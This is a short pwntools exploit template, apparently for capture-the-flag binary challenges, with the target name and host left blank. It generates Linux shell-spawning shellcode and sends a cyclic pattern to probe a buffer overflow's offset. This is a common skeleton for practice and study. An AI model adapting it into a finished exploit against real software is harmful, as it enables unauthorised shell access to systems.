#!/usr/bin/python3
from pwn import *

REMOTE = False
NAME = ""
if REMOTE or args["REMOTE"]:
    p = remote("", 9999)
else:
    p = process(f"./{NAME}")
    gdb.attach(p, "pattern create 200")

binary = ELF(f"./{NAME}")
context.update(os="linux", arch="amd64")

shellcode = shellcraft.linux.sh()
assembled = asm(shellcode)

payload = flat([
    "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
])
p.sendline(payload)

p.interactive()
